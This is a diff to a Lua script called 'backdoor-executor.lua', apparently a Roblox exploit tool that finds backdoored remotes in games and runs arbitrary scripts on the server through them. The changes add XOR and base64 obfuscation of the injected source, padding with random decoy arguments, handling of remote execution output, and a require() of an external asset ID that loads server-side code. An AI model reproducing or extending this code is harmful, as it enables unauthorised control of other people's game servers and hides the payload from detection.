@@ -49,7 +49,7 @@ local msgOutputs = {
 	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
 	["failedRemoteRedirection"] = "Remote redirection failed to load, using original remote.",
 	["printRemote"] = "\n Remote: %s | [%s]\n Type: %s",
-	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n--]]\n",
+	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n\tDocumentation: https://github.com/jLn0n/scripts/blob/main/backdoor-executor/README.MD\n--]]\n",
 }
 local stringifiedTypes = {
 	EnumItem = function(value)
@@ -245,33 +245,52 @@ local function getRemoteFunc(remoteObj)
 	)
 end
 
-local function applyRedirectedRemoteSecurity(source)
-	if not config.redirectRemote then return end
-	local argsLenght = math.random(12, 32)
-	local generatedArgs = table.create(argsLenght)
-	local srcArgIdx = math.random(2, (argsLenght - 1))
-	local verificationIdx = notSameRandNumber(8, (argsLenght - 2), srcArgIdx)
-	local randIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx)
-	local nonceIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx, randIdx)
+local applyRedirectedRemoteSecurity do
+	-- simple XOR encryption algorithm, nothing special
+	local function XORSource(source: string, key: number): string
+		local randomObj = Random.new(key)
+		local result = ""
 
-	generatedArgs[1] = (
-		if (math.random(1, 2) == 2) then
-			generateRandString(verificationIdx)
-		else verificationIdx
-	)
-	generatedArgs[verificationIdx] = true -- sets a boolean at idx `verificationIdx`
-	generatedArgs[srcArgIdx] = crypt.base64encode(source) -- encodes source to base64
-	generatedArgs[randIdx] = srcArgIdx -- sets the value `srcArgIdx` to `randIdx`
-	generatedArgs[nonceIdx] = "\127@" .. generateRandString(randIdx + argsLenght) -- generates a nonce that is the lenght of `randIdx`
+		for idx = 1, #source do
+			local charByte = string.byte(source, idx, idx)
+			local offset = ((idx % randomObj:NextInteger(0, 96)) + randomObj:NextInteger(0, 16))
+			charByte = bit32.bxor(offset, charByte, randomObj:NextInteger(0, 16))
 
-	for argIndex = 2, (argsLenght - 1) do -- inserts random jibberish
-		if typeof(generatedArgs[argIndex]) ~= "nil" then continue end
-		local useString = math.random(1, 2) == 2
-
-		generatedArgs[argIndex] = (if useString then generateRandString(math.random(12, 48)) else math.random(1, 255))
+			result ..= string.char(charByte)
+		end
+		result = string.gsub(result, ".", function(value) return "\\" .. string.byte(value) end)
+		return result
 	end
 
-	return generatedArgs
+	function applyRedirectedRemoteSecurity(source)
+		if not config.redirectRemote then return end
+		local argsLenght = math.random(12, 32)
+		local generatedArgs = table.create(argsLenght)
+		local srcArgIdx = math.random(2, (argsLenght - 1))
+		local verificationIdx = notSameRandNumber(8, (argsLenght - 2), srcArgIdx)
+		local randIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx)
+		local nonceIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx, randIdx)
+		local XORKey = math.ceil((((argsLenght / randIdx) % verificationIdx) * nonceIdx) * (verificationIdx * srcArgIdx))
+
+		generatedArgs[1] = (
+			if (math.random(1, 2) == 2) then
+				generateRandString(verificationIdx)
+			else verificationIdx
+		)
+		generatedArgs[verificationIdx] = true -- sets a boolean at idx `verificationIdx`
+		generatedArgs[srcArgIdx] = crypt.base64encode(XORSource(source, XORKey))
+		generatedArgs[randIdx] = srcArgIdx -- sets the value `srcArgIdx` to `randIdx`
+		generatedArgs[nonceIdx] = "\127@" .. generateRandString(randIdx + argsLenght) -- generates a nonce that is the lenght of `randIdx`
+
+		for argIndex = 2, argsLenght do -- inserts random jibberish
+			if typeof(generatedArgs[argIndex]) ~= "nil" then continue end
+			local useString = math.random(1, 2) == 2
+
+			generatedArgs[argIndex] = (if useString then generateRandString(math.random(12, 48)) else math.random(1, 255))
+		end
+
+		return generatedArgs
+	end
 end
 
 local function execScript(source, noRedirectOutput)
@@ -288,24 +307,24 @@ local function execScript(source, noRedirectOutput)
 		connection = insertService.ChildAdded:Connect(function(object)
 			if object.Name ~= nonce then return end connection:Disconnect()
 
-			if object.Value then
-				local rawStdout = object:GetAttribute("stdout")
-				local jsonConverted, stdout = pcall(httpService.JSONDecode, httpService, rawStdout)
-				if not (jsonConverted and typeof(stdout) == "table") then return end
+			local rawStdout = object:GetAttribute("stdout")
+			local jsonConverted, stdout = pcall(httpService.JSONDecode, httpService, rawStdout)
+			if not (jsonConverted and typeof(stdout) == "table") then return end
 
-				for _, output in stdout do
-					local outputType, timestamp = (
-						if output[1] == 0 then
-							Enum.MessageType.MessageOutput
-						elseif output[1] == 1 then
-							Enum.MessageType.MessageWarning
-						else nil
-					), output[2]
-					output = table.concat(output, " ", 3)
+			for _, output in stdout do
+				local outputType, timestamp = (
+					if output[1] == 0 then
+						Enum.MessageType.MessageOutput
+					elseif output[1] == 1 then
+						Enum.MessageType.MessageWarning
+					else nil
+				), output[2]
+				output = table.concat(output, " ", 3)
 
-					execGuiAPI.console.createOutput(output, outputType, timestamp)
-				end
-			else
+				execGuiAPI.console.createOutput(output, outputType, timestamp)
+			end
+
+			if not object.Value then
 				execGuiAPI.console.createOutput(object:GetAttribute("stderr"), Enum.MessageType.MessageError)
 			end
 		end)
@@ -334,7 +353,7 @@ local function initRemoteRedirection()
 	if not (remoteInfo.foundBackdoor and (config.redirectRemote and not remoteRedirectionInitialized)) then return false end
 	local nonce = generateRandString(32, true)
 
-	execScript(`require(11906423264)("{nonce}", %userid%)`, true)
+	execScript(`require(11906423264)("{nonce}", %userid%)`, true) -- if you wanna try out new features, put 11906414795 as the requireId
 	-- we need to improvise until :WaitForAttribute is added
 	waitUntil(5, function() return insertService:GetAttribute(nonce) end)
 	local redirectedRemotePath = insertService:GetAttribute(nonce)
